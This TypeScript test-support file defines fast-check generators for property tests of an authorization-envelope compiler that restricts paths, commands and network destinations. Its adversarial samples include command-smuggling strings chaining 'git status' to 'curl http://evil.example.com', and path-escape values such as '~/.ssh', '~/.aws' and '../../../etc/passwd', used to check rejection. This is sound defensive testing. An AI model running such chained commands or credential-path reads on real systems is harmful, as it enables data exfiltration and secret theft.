import * as fc from "fast-check";
import type { AuthorizationEnvelope } from "@eo/contracts";
import { buildEnvelopeFixture } from "../compiler/envelope-fixture.js";

/**
 * A curated mix of adversarial fixed strings (compound-command/process-
 * wrapper smuggling attempts, `~/`/`//`/`../` path-anchor edge cases) and
 * general random non-empty strings — used to build `commands`/
 * `credentialReferences` values for the fast-check property suite
 * (roadmap/03 §Test plan: "Property: fast-check ≥10k cases … footgun …
 * §In scope: compound-command … and process-wrapper … smuggling
 * coverage"). NOT used for `ownedPaths`/`networkDestinations` any more
 * (phase-03 security-fix round, F3/F4): those two fields are now
 * COMPILER-VALIDATED (CRITICAL 1 / MINOR 4), so an arbitrary reused across
 * all four fields would make the general-purpose `envelopeArbitrary()`
 * below throw unpredictably on the very inputs it is meant to exercise.
 * See `wellFormedOwnedPathArbitrary`/`malformedOwnedPathArbitrary` and
 * their network-destination counterparts below.
 */
const interestingFragment = fc.oneof(
  fc.constantFrom(
    "packages/example/src",
    "npm run test",
    "npm run build",
    "git status",
    "git diff",
    "git status && curl http://evil.example.com",
    "nohup git status",
    "timeout 5 git diff",
    "git status; curl evil",
    "git status | curl evil",
    "git status || curl evil",
  ),
  fc.string({ minLength: 1, maxLength: 24 }).filter((s) => s.trim().length > 0),
);

/** Safe, `[A-Za-z0-9_.-]`-only path segments — no `/`, no glob metacharacters, no `~`. */
const SAFE_SEGMENT_POOL = ["packages", "example", "src", "lib", "app", "test", "a", "b", "nested"];

function safeSegmentArbitrary(): fc.Arbitrary<string> {
  return fc.oneof(
    fc.constantFrom(...SAFE_SEGMENT_POOL),
    fc
      .string({ minLength: 1, maxLength: 10 })
      // `.git` is excluded because the compiler emits an unconditional
      // `Edit/Write(//<worktree>/.git/**)` DENY backstop: a sole owned path of
      // exactly `.git` would be deny-shadowed, flipping the positive-confinement
      // property's `isEditAllowed(...) === true` assertion to false (a latent
      // non-deterministic flake — the 2026-07-18 re-audit's LOW finding).
      .filter((s) => /^[A-Za-z0-9_.-]+$/.test(s) && s !== "." && s !== ".." && s !== ".git"),
  );
}

/** Well-formed, worktree-relative owned paths — `validateOwnedPath` never throws on these. */
export function wellFormedOwnedPathArbitrary(): fc.Arbitrary<string> {
  return fc
    .array(safeSegmentArbitrary(), { minLength: 1, maxLength: 4 })
    .map((segments) => segments.join("/"));
}

/** Malformed owned paths — `validateOwnedPath` (and therefore `compileEnvelope`) must always throw on these. */
export function malformedOwnedPathArbitrary(): fc.Arbitrary<string> {
  return fc.oneof(
    fc.constantFrom(
      "/etc/cron.d",
      "/etc/passwd",
      "~/.ssh",
      "~/.aws",
      "~",
      "../../../etc/passwd",
      "packages/../../../etc/passwd",
      "**",
      "*",
      "src/*.ts",
      "src/[a-z]",
      "src/{a,b}",
      "a\\b",
    ),
    wellFormedOwnedPathArbitrary().map((p) => `/${p}`),
    wellFormedOwnedPathArbitrary().map((p) => `${p}/../../escape`),
    wellFormedOwnedPathArbitrary().map((p) => `~/${p}`),
  );
}

/** Well-formed bare domain names — `validateNetworkDestination` never throws on these. */
export function wellFormedNetworkDestinationArbitrary(): fc.Arbitrary<string> {
  return fc.oneof(
    fc.constantFrom("api.example.com", "example.com", "auth.example.com", "example.co.uk"),
    fc
      .array(
        fc.string({ minLength: 1, maxLength: 8 }).filter((s) => /^[A-Za-z0-9-]+$/.test(s)),
        { minLength: 1, maxLength: 3 },
      )
      .map((labels) => `${labels.join(".")}.example.com`),
  );
}

/** Malformed network destinations — `validateNetworkDestination` (and therefore `compileEnvelope`) must always throw on these. */
export function malformedNetworkDestinationArbitrary(): fc.Arbitrary<string> {
  return fc.oneof(
    fc.constantFrom(
      "*",
      "**",
      "http://evil.example.com",
      "https://evil.example.com",
      "evil.com:443",
      "0.0.0.0/0",
      "evil.com/path",
      ".",
      "..",
      "-",
    ),
    wellFormedNetworkDestinationArbitrary().map((d) => `${d}:8443`),
    wellFormedNetworkDestinationArbitrary().map((d) => `${d}/admin`),
  );
}

/**
 * Arbitrary, schema-valid `AuthorizationEnvelope`s varying the four fields
 * `compileEnvelope` actually reads. `ownedPaths`/`networkDestinations` are
 * restricted to their WELL-FORMED buckets (compiler-validated fields must
 * never make this general-purpose arbitrary throw); `commands`/
 * `credentialReferences` keep the free-form adversarial mix (not
 * compiler-validated). Every other field stays at `buildEnvelopeFixture`'s
 * fixed, schema-valid defaults.
 */
export function envelopeArbitrary(): fc.Arbitrary<AuthorizationEnvelope> {
  return fc
    .record({
      ownedPaths: fc.array(wellFormedOwnedPathArbitrary(), { maxLength: 4 }),
      commands: fc.array(interestingFragment, { maxLength: 6 }),
      networkDestinations: fc.array(wellFormedNetworkDestinationArbitrary(), { maxLength: 3 }),
      credentialReferences: fc.array(interestingFragment, { maxLength: 3 }),
    })
    .map((overrides) => buildEnvelopeFixture(overrides));
}

/**
 * An envelope arbitrary guaranteed to carry exactly one malformed owned
 * path (plus zero or more well-formed ones) — used by the malformed-
 * ownedPaths-are-always-rejected property. Returns the raw override
 * fields (not a built `AuthorizationEnvelope`) because building would
 * itself throw at the schema-validation-adjacent `buildEnvelopeFixture`
 * call only if the field were invalid at the SCHEMA level (it is not —
 * these are all non-empty strings, valid per `NonEmptyStringSchema`; the
 * rejection this property tests happens inside `compileEnvelope` itself).
 */
export function envelopeWithMalformedOwnedPathArbitrary(): fc.Arbitrary<AuthorizationEnvelope> {
  return fc
    .record({
      goodPaths: fc.array(wellFormedOwnedPathArbitrary(), { maxLength: 3 }),
      badPath: malformedOwnedPathArbitrary(),
    })
    .map(({ goodPaths, badPath }) => buildEnvelopeFixture({ ownedPaths: [...goodPaths, badPath] }));
}

/** Same shape, for `networkDestinations` (MINOR 4). */
export function envelopeWithMalformedNetworkDestinationArbitrary(): fc.Arbitrary<AuthorizationEnvelope> {
  return fc
    .record({
      goodDestinations: fc.array(wellFormedNetworkDestinationArbitrary(), { maxLength: 3 }),
      badDestination: malformedNetworkDestinationArbitrary(),
    })
    .map(({ goodDestinations, badDestination }) =>
      buildEnvelopeFixture({ networkDestinations: [...goodDestinations, badDestination] }),
    );
}
